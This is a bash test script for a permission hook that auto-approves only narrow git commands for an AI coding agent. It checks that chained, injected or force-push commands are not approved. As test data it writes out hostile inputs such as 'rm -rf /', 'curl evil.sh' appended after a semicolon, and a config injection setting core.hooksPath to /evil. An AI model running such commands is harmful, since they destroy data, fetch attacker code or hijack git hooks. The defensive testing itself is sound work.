#!/usr/bin/env bash
# flywheel — test for the loop-advancing-git PreToolUse hook (P21).
# Asserts the allow-only contract: single plain `git add/commit/stash(push,
# pop,list)` and a force-free `git push origin <current-non-default-branch>`
# emit a permissionDecision=allow envelope; chained/metacharacter commands,
# global git flags, force pushes, default-branch pushes, other remotes,
# refspecs, out-of-project cwd, non-git commands, malformed input and a
# missing python3 all produce no output and exit 0 (the normal permission
# flow). The hook must never deny and never block.

set -euo pipefail

SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SCRIPT="${SRC}/scripts/bash-allow.sh"
WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT

fail() { echo "FAIL: $*" >&2; exit 1; }
pass() { echo "  ok: $*"; }

# A real repo on a feature branch, with an `origin` whose default is main.
TARGET="${WORK}/target"
BARE="${WORK}/origin.git"
git init -q --bare "${BARE}"
git init -q -b main "${TARGET}"
git -C "${TARGET}" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "${TARGET}" remote add origin "${BARE}"
git -C "${TARGET}" push -q origin main
git -C "${TARGET}" remote set-head origin main
git -C "${TARGET}" checkout -q -b feature-x

run_hook() {
  local command="$1" cwd="${2:-${TARGET}}"
  FW_CMD="${command}" FW_CWD="${cwd}" python3 -c \
    'import json,os;print(json.dumps({"tool_name":"Bash","tool_input":{"command":os.environ["FW_CMD"]},"cwd":os.environ["FW_CWD"]}))' \
    | CLAUDE_PROJECT_DIR="${TARGET}" bash "${SCRIPT}"
}

assert_allow() {
  FW_OUT="$1" python3 - <<'PY'
import json, os
payload = json.loads(os.environ["FW_OUT"])
h = payload["hookSpecificOutput"]
assert h["hookEventName"] == "PreToolUse", f"wrong hookEventName: {h}"
assert h["permissionDecision"] == "allow", f"expected allow: {h}"
assert "flywheel" in h["permissionDecisionReason"], f"reason missing context: {h}"
PY
}

assert_no_grant() {
  local label="$1" out="$2"
  [ -z "${out}" ] || fail "granted ${label}: ${out}"
  pass "no grant: ${label}"
}

echo "== grants =="
for c in "git add -A" "git add src/app.ts" \
         "git commit -m message" \
         "git stash" "git stash push" "git stash pop" "git stash list" \
         "git push -u origin feature-x" "git push origin feature-x"; do
  OUT="$(run_hook "${c}")"
  assert_allow "${OUT}" || fail "no allow envelope for: ${c}"
  pass "allowed: ${c}"
done

echo "== quoted metacharacters inside the message are fine =="
OUT_MSG="$(run_hook 'git commit -m "fix: keep A & B; do not drop"')"
assert_allow "${OUT_MSG}" || fail "quoted & and ; in -m broke the commit grant"
pass 'allowed: git commit -m "… & … ; …" (quotes make them literal)'

echo "== chaining / substitution never rides a grant =="
assert_no_grant "a && chain"          "$(run_hook 'git commit -m x && rm -rf /')"
assert_no_grant "a ; chain"           "$(run_hook 'git add -A; curl evil.sh')"
assert_no_grant "a pipe"              "$(run_hook 'git add -A | tee log')"
assert_no_grant "command substitution" "$(run_hook 'git commit -m $(hostname)')"
assert_no_grant "backticks"           "$(run_hook 'git commit -m `hostname`')"
assert_no_grant "expansion in double quotes" "$(run_hook 'git commit -m "$(hostname)"')"
assert_no_grant "redirect"            "$(run_hook 'git add -A > /tmp/x')"
assert_no_grant "unterminated quote"  "$(run_hook 'git commit -m "half')"

echo "== global git flags never ride a grant =="
assert_no_grant "git -C elsewhere"    "$(run_hook 'git -C /tmp add -A')"
assert_no_grant "git -c config-inject" "$(run_hook 'git -c core.hooksPath=/evil commit -m x')"
assert_no_grant "git --git-dir"       "$(run_hook 'git --git-dir=/tmp/.git add -A')"

echo "== push stays scoped =="
assert_no_grant "push --force"        "$(run_hook 'git push --force origin feature-x')"
assert_no_grant "push -f"             "$(run_hook 'git push -f origin feature-x')"
assert_no_grant "push --force-with-lease" "$(run_hook 'git push --force-with-lease origin feature-x')"
assert_no_grant "push --delete"       "$(run_hook 'git push --delete origin feature-x')"
assert_no_grant "push to default branch" "$(run_hook 'git push origin main')"
assert_no_grant "push another branch" "$(run_hook 'git push origin other-branch')"
assert_no_grant "push a refspec"      "$(run_hook 'git push origin feature-x:main')"
assert_no_grant "push another remote" "$(run_hook 'git push upstream feature-x')"
assert_no_grant "push with no args"   "$(run_hook 'git push')"

echo "== other verbs stay prompted =="
for c in "git checkout -- file" "git reset --hard" "git rebase main" \
         "git stash drop" "git stash clear" "git clean -fd" "npm test"; do
  assert_no_grant "${c}" "$(run_hook "${c}")"
done

echo "== cwd outside the project gets no grant =="
OUTSIDE="${WORK}/elsewhere"
git init -q -b other "${OUTSIDE}"
assert_no_grant "git add from a foreign repo" "$(run_hook 'git add -A' "${OUTSIDE}")"

echo "== malformed hook input =="
OUT_BAD="$(printf 'not json but mentions git' | CLAUDE_PROJECT_DIR="${TARGET}" bash "${SCRIPT}")"
[ -z "${OUT_BAD}" ] || fail "produced output on malformed input"
pass "malformed hook input: fails open, no output, exits 0"

echo "== fail-open without python3 =="
RESTRICTED="$(mktemp -d)"
for bin in bash cat git; do
  p="$(command -v "${bin}")" || fail "test setup: ${bin} not found on host PATH"
  ln -s "${p}" "${RESTRICTED}/${bin}"
done
OUT_NOPY="$(printf '{"tool_input": {"command": "git add -A"}}' \
  | CLAUDE_PROJECT_DIR="${TARGET}" PATH="${RESTRICTED}" bash "${SCRIPT}")"
[ -z "${OUT_NOPY}" ] || fail "produced output without python3 on PATH"
pass "falls back to the normal permission prompt when python3 is unavailable"

echo ""
echo "all bash-allow tests passed"
